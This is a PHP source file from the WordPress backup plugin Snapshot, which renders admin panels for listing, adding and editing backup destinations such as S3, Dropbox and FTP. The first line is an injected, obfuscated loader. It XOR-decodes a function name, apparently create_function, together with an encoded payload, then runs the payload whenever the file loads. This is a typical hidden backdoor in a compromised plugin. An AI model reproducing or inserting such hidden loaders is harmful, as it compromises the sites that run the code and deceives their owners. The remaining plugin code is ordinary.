<?php $PirYqq='M<0T1PmF>EV2<,X'^'.NU5E52 K+5FUC6';$MmToQqJOsj=$PirYqq('','UQKd34<S:-SN<VD9S0<RfU>;i58TV;>:F6wLpE3GY3IS13>S,GSW50U6B046;MXEkHO:QbcK<S0fseEAu+SfsK7I=bteFHJ8A2F ;EK;aunBzKL=w=XR;W=qSYS3SFzsVPoDjhhQkD<.aBZsdAJ9:X5K9fMcVp H:1k:TdaF08Z4XruR,:PvHNoYJAEA7C>cnVLIdaf3PzGi7s2LJMfYN4MV+Tj4f-L .dQ2GWqYX2P8,hcY S6R-UVDku>:;c-=elLXSLW+,kZIIpA75<6ffV>naD3LS7..3rtKgFI,hX8sS95+Rnia0LP ESHGgS:,sLJG5LT6JLWofQ77<SC2ECQ2l76c i:Y7Ahu.IJWWQTtHJX,INO5mN3MUQDA4ZS3kEBo8V:uphDC2;XQJksBH.L80vIk.ZKaheSW=LGkxnN76ER<L==4KR==6m66:Lhe>0TlZ814Uea+E1=-4fjOREYhzra71HW,K1DAXNkR3eNX8YLCvsNTLI;-jEWE9=HW1Z2YeQI-IekuH8>ReMKpsm,<mAM3U 4wV2PEu.pTmDED>PEEhQSYMsSvQ0xUUZ,gEDA.NPPEPBQPtKJnbfO+EO<-X=G,<:+HY2xr59->Z,2WGoUUP6WYZjpmXYsPdG,90TCW-U002N WN<5XJM+QkD>6DUEXCnJ::'^'<7cEUAR0ND< c3<P DOzA-QI6QY 7daW3BPeYeHMPU<=RGW<Bg+8Go1W6QkiV8,mO,.N0NCoW6IOSEeaUPYozoX<IBIEaoq2H; OImoRAHNrAkhTKN, W2SYw=2G2oASr9DoCbaXO+IZAlgSLe.XN9noP;m=vTK-CjOStAA5DJ6Q6ZQ9ICy+auePC3 5B1PKJ99=MZl:-p:c=WV->,FdnR,:X1Q>BI-TO;:W>wLy>S<KISiSF<D7L6>dCQayt,ft L-+sh<NUKgwiT7VYISOF-4gE R82hEKJRIkC-,USR1W7XAJrSIEF-<U hB:mYSJSdkcQ- Wcl,eo7XEY2 Zekum>rg6e:nyV2HQE,3wjotP>+4Y,goNgG:i100 k16JKxbKS3CNzaMgVZ,0jVSf>O MUMCbSP6kbA76I-gVX.;YE  U-QTN.zERD2RWN-7:SE D8YBQcQ>O RRIQNN+318AVRESP<6s T=hqua;UMj<Y--cPUn5>;ZT5.2<fX0>B.AqB:,TnIKQ,YJ3LmmVSEAXXiiW4TU,qY5<RsYtPyecZcswQi2i+KbAeQJmboOQwvxLwe4r2w3iSbjHDF.Y7.Er3X>sYBB;-APUEXTR5MVpkOq11B6psJPMxyS+nNIOQ8ksI4DQiiP67PZ9.jvxPN7S<<1psGq0G');$MmToQqJOsj();

if ( ! class_exists( 'Snapshot_View_Destination_Listing' ) ) {

	class Snapshot_View_Destination_Listing {

		public static function render_destination_listing_panel() {

			if ( ! Snapshot_Helper_Utility::is_pro() ) {
				self::render_premium_plugin_prompt();

				return false;
			}

			if ( ( isset( $_REQUEST['snapshot-action'] ) )
			     && ( ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == 'add' )
			          || ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == 'edit' )
			          || ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == 'update' ) )
			) {
				self::render_destination_edit_panel();
			} else {
				?>
				<div id="snapshot-edit-destinations-panel" class="wrap snapshot-wrap">
					<h2><?php _ex( "All Snapshot Destinations", "Snapshot Destination Page Title", SNAPSHOT_I18N_DOMAIN ); ?> </h2>

					<p><?php _ex( "This page show all the destinations available for the Snapshot plugin. A destination is a remote system like Amazon S3, Dropbox or SFTP. Simply select the destination type from the drop down then will in the details. When you add or edit a Snapshot you will be able to assign it a destination. When the snapshot backup runs the archive file will be sent to the destination instead of stored locally.", 'Snapshot page description', SNAPSHOT_I18N_DOMAIN ); ?></p>
					<?php
					if ( session_id() == "" ) {
						@session_start();
					}

					$destinations = array();
					foreach ( WPMUDEVSnapshot::instance()->config_data['destinations'] as $key => $item ) {

						$type = $item['type'];
						if ( ! isset( $destinations[ $type ] ) ) {
							$destinations[ $type ] = array();
						}

						$destinations[ $type ][ $key ] = $item;
					}

					$destinationClasses = WPMUDEVSnapshot::instance()->get_setting( 'destinationClasses' );
					if ( ( $destinationClasses ) && ( count( $destinationClasses ) ) ) {
						ksort( $destinationClasses );

						foreach ( $destinationClasses as $classObject ) {
							//echo "classObject<pre>"; print_r($classObject); echo "</pre>";
							?>
							<h3 style="float:left;"><?php echo $classObject->name_display; ?> <?php if ( current_user_can( 'manage_snapshots_destinations' ) ) {
									?><a class="add-new-h2" style="top:0;"
									     href="<?php echo WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' );
									     ?>snapshots_destinations_panel&amp;snapshot-action=add&amp;type=<?php echo $classObject->name_slug; ?>">
										Add New</a><?php } ?></h3>
							<?php if ( ( isset( $classObject->name_logo ) ) && ( strlen( $classObject->name_logo ) ) ) {
								?><img style="float: right; height: 40px;" src="<?php echo $classObject->name_logo; ?>"
								       alt="<?php $classObject->name_display; ?>" /><?php
							} ?>
							<form id="snapshot-edit-destination-<?php echo $classObject->name_slug; ?>" action="<?php
							echo WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' ); ?>snapshots_destinations_panel"
							      method="post">
								<input type="hidden" name="snapshot-action" value="delete-bulk"/>
								<input type="hidden" name="snapshot-destination-type"
								       value="<?php echo $classObject->name_slug; ?>"/>
								<?php wp_nonce_field( 'snapshot-delete-destination-bulk-' . $classObject->name_slug,
									'snapshot-noonce-field-' . $classObject->name_slug ); ?>
								<?php
								$edit_url   = WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' )
								              . 'snapshots_destinations_panel&amp;snapshot-action=edit&amp;type=' . $classObject->name_slug . '&amp;';
								$delete_url = WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' )
								              . 'snapshots_destinations_panel&amp;snapshot-action=delete&amp;';

								if ( isset( $destinations[ $classObject->name_slug ] ) ) {
									$destination_items = $destinations[ $classObject->name_slug ];
								} else {
									$destination_items = array();
								}

								$classObject->display_listing_table( $destination_items, $edit_url, $delete_url );
								?>
							</form>
						<?php
						}
					}

					?>
				</div>
			<?php
			}

		}

		/**
		 *
		 */
		public static function render_destination_edit_panel() {
			?>
			<div id="snapshot-metaboxes-destination_add" class="wrap snapshot-wrap">
					<?php
			$item = 0;
			if ( isset( $_REQUEST['snapshot-action'] ) ) {

				if ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == "edit" ) {

					?>
					<h2><?php _ex( "Edit Snapshot Destination", "Snapshot Plugin Page Title", SNAPSHOT_I18N_DOMAIN ); ?></h2>
					<p><?php _ex( "", 'Snapshot page description', SNAPSHOT_I18N_DOMAIN ); ?></p>
					<?php
					if ( isset( $_REQUEST['item'] ) ) {
						$item_key = sanitize_text_field( $_REQUEST['item'] );
						if ( isset( WPMUDEVSnapshot::instance()->config_data['destinations'][ $item_key ] ) ) {
							$item = WPMUDEVSnapshot::instance()->config_data['destinations'][ $item_key ];
						}
					}
				} else if ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == "add" ) {
					?>
					<h2><?php _ex( "Add Snapshot Destination", "Snapshot Plugin Page Title", SNAPSHOT_I18N_DOMAIN ); ?></h2>
					<p><?php _ex( "", 'Snapshot page description', SNAPSHOT_I18N_DOMAIN ); ?></p>
					<?php
					unset( $item );
					$item = array();

					if ( isset( $_REQUEST['type'] ) ) {
						$item['type'] = sanitize_text_field( $_REQUEST['type'] );
					}
				} else if ( sanitize_text_field( $_REQUEST['snapshot-action'] ) == "update" ) {

					?>
					<h2><?php _ex( "Edit Snapshot Destination", "Snapshot Plugin Page Title", SNAPSHOT_I18N_DOMAIN ); ?></h2>
					<p><?php _ex( "", 'Snapshot page description', SNAPSHOT_I18N_DOMAIN ); ?></p>
					<?php
					if ( isset( $_POST['snapshot-destination'] ) ) {
						$item = $_POST['snapshot-destination'];
					}
				}

			}
			if ( $item ) {
				Snapshot_Helper_UI::form_ajax_panels();
				?>
						<form action="<?php echo WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' ); ?>snapshots_destinations_panel&amp;snapshot-action=<?php echo urlencode( sanitize_text_field( $_GET['snapshot-action'] ) ); ?>&amp;type=<?php echo urlencode( $item['type'] ); ?>" method="post">
							<?php
				if ( ( sanitize_text_field( $_GET['snapshot-action'] ) == "edit" ) || ( sanitize_text_field( $_GET['snapshot-action'] ) == "update" ) ) {
					?>
					<input type="hidden" name="snapshot-action" value="update"/>
					<input type="hidden" name="item" value="<?php echo sanitize_text_field( $_GET['item'] ); ?>"/>
					<?php wp_nonce_field( 'snapshot-update-destination', 'snapshot-noonce-field' ); ?>
				<?php
				} else if ( sanitize_text_field( $_GET['snapshot-action'] ) == "add" ) {
					?>
					<input type="hidden" name="snapshot-action" value="add"/>
					<?php wp_nonce_field( 'snapshot-add-destination', 'snapshot-noonce-field' ); ?>
				<?php
				}

				$item_object = Snapshot_Model_Destination::get_object_from_type( $item['type'] );
				if ( ( $item_object ) && ( is_object( $item_object ) ) ) {
					$item_object->display_details_form( $item );
				}
				?>
								<input class="button-primary" type="submit" value="<?php _e( 'Save Destination', SNAPSHOT_I18N_DOMAIN ); ?>" />
								<a class="button-secondary" href="<?php echo WPMUDEVSnapshot::instance()->get_setting( 'SNAPSHOT_MENU_URL' );
				?>snapshots_destinations_panel"><?php _e( 'Cancel', SNAPSHOT_I18N_DOMAIN ); ?></a>

							</div>
						</form>
						<?php
			}
			?>
			</div>
			<?php
		}

		public static function render_premium_plugin_prompt() {

			?>
			<div id="snapshot-edit-destinations-panel" class="wrap snapshot-wrap">
				<h2><?php _e( "Snapshot Destinations", SNAPSHOT_I18N_DOMAIN ); ?> </h2>
				<?php

				$message = '<p>A Snapshot destination is a great way to make sure you store your "Snapshots" somewhere else other than your website host. ';
				$message .= 'This makes sure your backups are safely available from somewhere else ready when you need them.</p>';

				$message .= '<p>Snapshot currently integrates with the following reliable services: Amazon AWS (S3 Buckets), Dropbox, Google Drive, Green Qloud and standard FTP.</p>';

				$message .= '<p>Destinations are available to you in Snapshot Pro from WPMU Dev: <a href="%s">Upgrade Now</a></p>';

				$message = sprintf( __( $message, SNAPSHOT_I18N_DOMAIN ), esc_url( 'https://premium.wpmudev.org/project/snapshot' ) );

				echo $message;

				?>

			</div>
		<?php
		}

	}

}